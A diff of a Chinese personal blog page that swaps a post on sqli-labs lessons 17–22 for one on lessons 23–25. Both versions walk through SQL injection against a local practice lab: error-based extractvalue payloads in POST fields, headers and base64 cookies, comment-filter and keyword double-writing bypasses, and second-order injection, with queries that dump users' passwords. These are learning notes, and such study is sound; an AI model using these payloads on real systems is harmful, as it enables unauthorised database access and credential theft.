@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="lesson17-22, 黛色若梦">
+    <meta name="keywords" content="lesson23-25, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>lesson17-22 | 黛色若梦</title>
+    <title>lesson23-25 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -316,7 +316,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">lesson17-22</h1>
+                    <h1 class="description center-align post-title">lesson23-25</h1>
                 </div>
             </div>
         </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-11-29
+                    2021-12-01
                 </div>
                 
 
@@ -469,70 +469,129 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>第十七关</p>
-<p>常规在uname注入行不通，来看看源码要不要改位置，发现uname里有一个函数，跳转查看</p>
-<p><img src="/images/17.png" alt="17"></p>
-<p><img src="/images/-16382011435491" alt="png"></p>
-<p>首先这里有个姿式须要 get：就是默认地 PHP 会对全部的 GET/POST/COOKIE 数据自动运行 addslashes() 函数，这是个什么东西呢？<br>addslashes()函数：一个会在预约义字符以前添加反斜杠的函数，即会帮助转义</p>
-<p>预约义字符有：函数</p>
-<ul>
-<li>单引号(’)</li>
-<li>双引号(“)</li>
-<li>反斜杠()</li>
-<li>NULL</li>
-</ul>
-<p>因此在平时过程当中，咱就不用手动加转义字符了，但怕有些人进行了双层转义，因此可使用 get_magic_quotes_gpc() 来进行检测，其参数为 string，string类型，内容为规定要转义的字符串，该函数返回内容为已转义的字符串，该函数适用于 PHP 版本 4.0+学习</p>
-<p>第三个要介绍的就是 stripslashes() 函数，该函数能够删除 addslashes() 函数添加的反斜杠code</p>
-<p>最后就是 mysql_real_escape_string() 函数：<br>它将转义 SQL 语句中使用的字符串中的特殊字符</p>
-<p>check_input 就对 username 作了各类转义字符的处理，使得咱们再 username payload 注入毫无效果，因此没法像前几关那样对 username 直接下手，既然没法下手，那就转场到 password</p>
-<p><img src="/images/17%EF%BC%881%EF%BC%89.png" alt="17（1）"></p>
-<p>要对passwd修改</p>
-<p>又为盲注类型</p>
-<p> payload报错</p>
-<p>//当然limit 可以修改，那要爆出所有的就又要脚本了。</p>
-<p>–查表<br><code>uname=admin&amp;passwd=111&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and &#39;1&amp;submit=submit</code></p>
-<p>–查列<br><code>uname=admin&amp;passwd=111&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),0x7e)) and &#39;1&amp;submit=submit</code></p>
-<p>–查用户名<br><code>uname=admin&amp;passwd=111&#39; and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and &#39;1&amp;submit=submit</code></p>
-<p>由于后台对 users 表作了限制，不给你查名称是 users 的，那我们就给它换个名字，加件衣服</p>
-<p>–绕过<br><code>uname=admin&amp;passwd=111&#39; and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and &#39;1&amp;submit=submit</code></p>
-<p>–查密码<br><code>uname=admin&amp;passwd=111&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and &#39;1&amp;submit=submit</code></p>
+                <p>今天的黑盾杯的理论赛都晋级不了还差30名，我反思了一下自己之前的学习知识的确不扎实，很多web专有名词明明已经了解过但还是想不太起来，感觉被打废了。的确自己还是太菜了，sql还是得继续，明年再战！！！</p>
 <hr>
-<p>第十八关</p>
-<p>这里开始就不只是在内容里注入了，这关是在HTTP HEADER 头部分。</p>
-<p>要点学习：</p>
-<p>1.补充一点PHP的知识：<img src="/images/18.png" alt="18"></p>
-<ul>
-<li><p>将$_SERVER当成普通数组一样，去修改它等操作。$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</p>
-</li>
-<li><p>HTTP_USER_AGENT</p>
-</li>
-<li><pre><code>&lt;?php var_dump(``$_SERVER``[``&#39;HTTP_USER_AGENT&#39;``]);?&gt;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-用户访问服务器时,利用PHP的超级全局变量``$_SERVER``数组中字段[``&#39;HTTP_USER_AGENT&#39;``] 获取访问用户的所有信息
-``例如：
-``&lt;?php 
- ``echo` `$_SERVER``[``&#39;HTTP_USER_AGENT&#39;``];
-   ``?&gt;
-   ``输出结果：
-Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.2; AskTbPTV/5.17.0.25589; Alexa Toolbar)
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- remote_addr</span><br><span class="line"></span><br><span class="line">  表示发出请求的远程主机的 IP 地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web[服务器](https://www.baidu.com/s?wd=服务器&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd)（[Nginx](https://www.baidu.com/s?wd=Nginx&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd)，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP。</span><br><span class="line"></span><br><span class="line">  [这里想分享一个好玩的，有点不务正业。。。](https://baike.baidu.com/item/%E8%B7%B3%E6%9D%BF/10319481)</span><br><span class="line"></span><br><span class="line">- ##### [请求头(这部分之前在web基础内容里我有了解过)](https://shianer.github.io/2021/10/22/http%E8%AF%B7%E6%B1%82%E5%8D%8F%E8%AE%AE/)</span><br><span class="line"></span><br><span class="line">Host:</span><br><span class="line"></span><br><span class="line">主要用于指定被请求资源的internet主机和端口</span><br><span class="line">user-agent</span><br><span class="line">请求报头域允许客户端将他的操作系统,浏览器和其他属性告诉服务器。我们登录一些网站时可以看到，显示我们的浏览器系统信息</span><br><span class="line">referer</span><br><span class="line"></span><br><span class="line">包含一个Url,代表访问Url的上一个url,就是用户从什么地方来到本页面</span><br><span class="line">cookie</span><br><span class="line"></span><br><span class="line">表示请求者身份</span><br><span class="line">range</span><br><span class="line"></span><br><span class="line">请求实体的部分内容，多线程下载，一定会用到</span><br><span class="line">x-forward-for</span><br><span class="line"></span><br><span class="line">xxf 头 他代表请求端的IP可以有多个中间用逗号隔开</span><br><span class="line">accept</span><br><span class="line"></span><br><span class="line">用于指定客户端接收哪些mine类型的信息</span><br><span class="line">accept-Charset:</span><br><span class="line"></span><br><span class="line">用于指定客户端接收的字符集，如果请求消息中没有设这个域，默认任何字符集都可以接受</span><br><span class="line"></span><br><span class="line">2.步骤</span><br><span class="line"></span><br><span class="line">![18对uname和passwd都进行了过滤](/images/18%E5%AF%B9uname%E5%92%8Cpasswd%E9%83%BD%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%BF%87%E6%BB%A4-16382845490161.png)</span><br><span class="line"></span><br><span class="line">![18.2](/images/18.2.png)</span><br><span class="line"></span><br><span class="line">发现两个都被过滤了，然后存在insert语句，注入点。</span><br><span class="line"></span><br><span class="line">在这一关卡，也是首先检查用户名和密码是否正确，正确了才能进行 UPDATE 操作，若有一错都不能进行 UPDATE 操作。这在源码里有要求。</span><br><span class="line"></span><br><span class="line">![18查数据库](/images/18%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png)</span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line"></span><br><span class="line">1‘ and extractvalue(1,concat(0x7e,(select conlumn_name from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line"></span><br><span class="line">1’ and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">1’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">第十九关</span><br><span class="line"></span><br><span class="line">referer</span><br><span class="line"></span><br><span class="line">包含一个Url,代表访问Url的上一个url,就是用户从什么地方来到本页面</span><br><span class="line"></span><br><span class="line">回显位在referer会报错，因此考虑一下注入点在referer，看看源码。</span><br><span class="line"></span><br><span class="line">![19（2）](/images/19%EF%BC%882%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">果然在referer里有一个insert语句。</span><br><span class="line"></span><br><span class="line">![19](/images/19.png)</span><br><span class="line"></span><br><span class="line">然后和十八题一样的步骤即可。</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">第二十关</span><br><span class="line"></span><br><span class="line">cookie</span><br><span class="line"></span><br><span class="line">表示请求者身份Cookie，有时也用其复数形式 [Cookies](https://baike.baidu.com/item/Cookies/187064)。类型为“**小型文本文件**”，是某些网站为了辨别用户身份，进行[Session](https://baike.baidu.com/item/Session/479100)跟踪而储存在用户本地终端上的数据（通常经过加密），由用户[客户端](https://baike.baidu.com/item/客户端/101081)计算机暂时或永久保存的信息。Cookie是保存在客户端的纯文本文件。比如txt文件。所谓的客户端就是我们自己的本地电脑。当我们使用自己的电脑通过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑。这个证书就是cookie。一般来说cookie都是服务器端写入客户端的纯文本文件。</span><br><span class="line"></span><br><span class="line">页面是这样一张图。</span><br><span class="line"></span><br><span class="line">![20](/images/20.png)</span><br><span class="line"></span><br><span class="line">![20（6）](/images/20%EF%BC%886%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">一样的，所以看看有没有其他注入点，发现了$cookee</span><br><span class="line"></span><br><span class="line">![20（4）](/images/20%EF%BC%884%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">![20（5）](/images/20%EF%BC%885%EF%BC%89-16382886493142.png)</span><br><span class="line"></span><br><span class="line">可以试试$cookee</span><br><span class="line"></span><br><span class="line">bp打开后，判断注入方式![20（2）](/images/20%EF%BC%882%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">之后就还是报错注入即可。</span><br><span class="line"></span><br><span class="line">![20（3）](/images/20%EF%BC%883%EF%BC%89-16382886965723.png)</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">第二十一关</span><br><span class="line"></span><br><span class="line">这里的cookie用bp后会发现</span><br><span class="line"></span><br><span class="line">![21](/images/21.png)</span><br><span class="line"></span><br><span class="line">cookie怪怪的，是base64编码。（以=结尾），接着用报错注入。</span><br><span class="line"></span><br><span class="line">![21（2）](/images/21%EF%BC%882%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">![21（3）](/images/21%EF%BC%883%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">![21（4）](/images/21%EF%BC%884%EF%BC%89.png)</span><br><span class="line"></span><br><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br><span class="line"></span><br><span class="line">YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj</span><br><span class="line"></span><br><span class="line">###### –查表 `uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSBsaW1pdCAwLDEpLDB4N2UpKSM=`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-uname=admin&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))#
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### –查列 `uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBjb2x1bW5fbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGFuZCB0YWJsZV9uYW1lID0gJ3VzZXJzJyBsaW1pdCAwLDEpLDB4N2UpKSM=`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-uname=admin&#39;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name = &#39;users&#39; limit 0,1),0x7e))#
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### –查用户名 `uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSkpIw==`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-uname=admin&#39;) and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))#
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### –查密码 `uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSkpIw==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e))#
-</code></pre>
-</li>
-</ul>
+<p>第二十三关（过滤）</p>
+<p>好好学PHP和mysql。。。</p>
+<p>又回到熟悉的get界面了。注入点确定后，判断注入方式是单引号。</p>
+<p>看看源码 </p>
+<p><img src="/images/23.png" alt="23"></p>
+<p>1.PHP语法</p>
+<h5 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h5><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern,replacement,subject[,limit=-1[,&amp;count]])</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">pattern</td>
+<td>要搜索的模式，可以是字符串或一个字符串数组</td>
+</tr>
+<tr>
+<td align="center">replacement</td>
+<td>用于替换的字符串或字符串数组</td>
+</tr>
+<tr>
+<td align="center">subject</td>
+<td>要搜索替换的目标字符串或字符串数组</td>
+</tr>
+<tr>
+<td align="center">limit</td>
+<td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</td>
+</tr>
+<tr>
+<td align="center">count</td>
+<td>可选，为替换执行的次数</td>
+</tr>
+</tbody></table>
+<p><code>preg_replace()</code>函数执行一个正则表达式的搜索和替换，搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p>
+<p>如果<code>subject</code>是一个数组，<code>preg_replace()</code>返回一个数组，其他情况下返回一个字符串。<br> 如果匹配被查找到，替换后的<code>subject</code>被返回，其他情况下返回没有改变的<code>subject</code>。如果发生错误，返回<code>NULL</code>。</p>
+<p>在这关中，也只是将<code>#</code>和<code>--</code>替换成了<code>空字符</code>。</p>
+<p>也就是说</p>
+<p>尝试两种注释方式注释没有起作用，即使把<code>#</code>URL编码为<code>%23</code>仍被过滤。</p>
+<p>2.所以可以构造另外的语句。之前在1-10关的哪一关，具体忘了已经用过这样的构造语句，和万能密码感觉很像。</p>
+<p>?id=1’  and ‘1’=’1</p>
+<p>这里注意注入点在<code>id</code>处，我们要判断字段数用的是<code>order by</code>子句，同时闭合第二个单引号：但是注意<img src="/images/23(2).png" alt="23(2)"></p>
+<p>后台的查询语句</p>
+<p><img src="/images/23%EF%BC%883%EF%BC%89sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5.png" alt="23（3）sql查询语句"></p>
+<p><img src="/images/23%EF%BC%884%EF%BC%89.png" alt="23（4）"></p>
+<p><code>where</code>与<code>order by</code>是子句，<code>and</code>是操作符，用于<code>where</code>子句。<br> 在MySQL的执行顺序中，<code>where</code>是远在<code>order by</code>前面的。</p>
+<p>在第一个查询语句中，<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code>作为<code>where</code>的条件，先被执行，得到结果集；然后是<code>order by</code>，因结果集中无第四个字段所以报错。</p>
+<p>在第二个查询语句中，<code>order by</code>在<code>where</code>的条件中，在<code>where</code>执行时被忽略了，结果集生成后并未再执行<code>order by</code>。</p>
+<p>所以这关不能用<code>order by</code>来判断字段数，而要用<code>union</code></p>
+<h5 id="padload"><a href="#padload" class="headerlink" title="padload"></a>padload</h5><p>（1）.字段</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=’<strong>1’ union select 1,2,3,4 or/and ‘1’=’1</strong>‘  LIMIT 0,1</p>
+</blockquote>
+<p>4爆错，而3不会，字段数为3.</p>
+<p>这里的<code>or</code>作为了联合查询第二个语句的条件而不是第一个语句<code>where</code>的条件。</p>
+<p>注意改id为不存在的值，其他的之前无差别了。</p>
+<p>因为这里涉及到<code>where</code>与<code>or</code>语句的混合，只能用<strong>双注入</strong>即<strong>CONCAT子查询</strong>。</p>
+<p>（2）.数据库</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8088/sqlilabs/Less-23/?id=-1&#39;">http://localhost:8088/sqlilabs/Less-23/?id=-1&#39;</a> union select 2,database(),4 or ‘1’=’1</p>
+<p>（3）.表名</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8088/sqlilabs/Less-23/?id=-1&#39;">http://localhost:8088/sqlilabs/Less-23/?id=-1&#39;</a> union select 2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),4 or ‘1’=’1</p>
+<p>这里的第二个字段括号里插入的是另一个句子，所以也就不用考虑from位置。</p>
+<p>（4）.字段名</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8088/sqlilabs/Less-23/?id=-1&#x27; union select 2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>网上看到<strong>注：</strong>其实不一定要用<code>or &#39;1&#39;=&#39;1</code>来闭合，也可以直接用<code>column_3</code>闭合：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8088/sqlilabs/Less-23/?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from users),&#x27;3</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/images/23%EF%BC%885%EF%BC%89.png" alt="23（5）"></p>
+<p>的确巧妙。。。看成字段了</p>
+<p>3.concat_ws用法</p>
+<h6 id="使用分隔符连接值"><a href="#使用分隔符连接值" class="headerlink" title="使用分隔符连接值"></a>使用分隔符连接值</h6><p>此示例串联 sys.databases 表中的三列，并使用 <code>-</code> 分隔这些值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT_WS( <span class="string">&#x27; - &#x27;</span>, database_id, recovery_model_desc, containment_desc)</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<p>1 - SIMPLE - NONE</p>
 <hr>
-<p>第二十二关</p>
-<p>和21关一样，判断注入方式。</p>
-<p><img src="/images/22%EF%BC%882%EF%BC%89.png" alt="22（2）"></p>
-<p><img src="/images/22%EF%BC%883%EF%BC%89.png" alt="22（3）"></p>
-<p><img src="/images/22.png" alt="22"></p>
-<p>可判断为双引号注入，接下来都与21关一样了。</p>
+<p>第二十四关（二阶注入）</p>
+<p>1.前言：SQL注入一般分为两类：一阶SQL注入（普通SQL注入），二阶SQL注入 。</p>
+<p>二阶注入是指客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令信息。虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，这样就可以利用这个构造一个二次注入。</p>
+<p>　　二阶注入也称为存储型的注入，就是将可能导致SQL注入的字符先存入到数据库中，当再次调用这个恶意构造的字符使用时，就可以出发SQL注入</p>
+<p>2.源码好多</p>
+<h5 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h5><p>在不看源码的情况下尝试分析：</p>
+<ul>
+<li><strong>登录界面</strong>，具有登录功能，同时有<strong>忘记密码</strong>和<strong>注册</strong>的链接。</li>
+<li><strong>注册界面</strong>，具有注册功能。</li>
+<li><strong>忘记密码界面</strong>，非常不友好…只有一张打脸的图。</li>
+<li><strong>修改密码界面</strong>，登陆成功后显示，有<strong>登出</strong>的链接。</li>
+<li><strong>登录失败界面</strong>，同样不友好。</li>
+</ul>
+<p>经过测试，初步判断注入点应该在<strong>注册界面</strong>，这里似乎对输入没有做任何检查，甚至能创建一个用户名和密码都为空的账户（查看 MySQL 后台数据证实）。</p>
+<p><img src="/images/24%E8%AF%B8%E5%A6%82%E6%AD%A4%E7%B1%BB%E6%98%AF%E7%BB%95%E8%BF%87%E7%9A%84.png" alt="24诸如此类是绕过的"></p>
+<p><code>mysql_escape_string()</code>和<code>mysql_real_escape_string()</code>是不同的，前者早在<code>PHP 5.3</code>中被弃用，在官方文档里对它的介绍也就一句话，就说处理特殊字符用于 MySQL 查询。</p>
+<p>对这两个的资料也少的可怜，查到一个：<code>mysql_escape_string()</code>没办法判断当前的编码，<code>mysql_real_escape_string()</code>之所以能够防注入，过滤。是因为同时指定了服务端的编码和客户端的编码。</p>
+<p>这就是二次注入，它的原理是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）后端（PHP）代码对语句进行了转义</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）保存进数据库（mysql）时没有转义，是原语句</span><br></pre></td></tr></table></figure>
+
+<p>比如前面所注册的admin ‘#账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string 等），’#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p>
+<p>那么修改密码时的语句如下：</p>
+<p>update users set  password=’123’ where username=’admin ‘#’<br>所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin.</p>
+<h6 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h6><p>至于如何防范二次注入也很简单： 一碗水端平，后端进行了转义，数据库也同样进行转义。</p>
+<h3 id="注意这里已经把admin密码换成1234了。"><a href="#注意这里已经把admin密码换成1234了。" class="headerlink" title="注意这里已经把admin密码换成1234了。"></a>注意这里已经把admin密码换成1234了。</h3><p>————————————————<br>版权声明：本文为CSDN博主「ihszg」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45663905/article/details/107684251">https://blog.csdn.net/weixin_45663905/article/details/107684251</a></p>
+<hr>
+<p>第二十五关</p>
+<p>看页面感觉是or或and的绕过。。</p>
+<p>看看源码</p>
+<p><img src="/images/25.png" alt="25"></p>
+<p>判断注入点，注入方法是单引号闭合。</p>
+<h5 id="padload-1"><a href="#padload-1" class="headerlink" title="padload"></a>padload</h5><p>只要用双写绕过即可，oorrder</p>
+<p>?id=-1’ oorrder by 4 报错，字段位为3。</p>
+<p><img src="/images/25%EF%BC%882%EF%BC%89.png" alt="25（2）"></p>
+<p>?id=-1’ union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata –+ </p>
+<p>?id=-1’ union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=”security”–+ </p>
+<p>?id=-1’ union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=”users”–+ </p>
+<p>?id=-1’ union select 1,group_concat(username,0x5c,passwoorrd),3 from users –+ </p>
+<p>0x5c化成/可以区别username和password</p>
 
                 
             </div>
@@ -559,7 +618,7 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/29/lesson17-22/">http://example.com/2021/11/29/lesson17-22/</a>
+                    <a href="http://example.com/2021/12/01/lesson23-25/">http://example.com/2021/12/01/lesson23-25/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -770,9 +829,10 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/12/01/lesson23-25/">
                     <div class="card-image">
@@ -790,9 +850,9 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -801,6 +861,7 @@ uname=admin&#39;) and extractvalue(1,concat(0x7e,(select password from users lim
                         </span>
                     </div>
                 </div>
+
                 
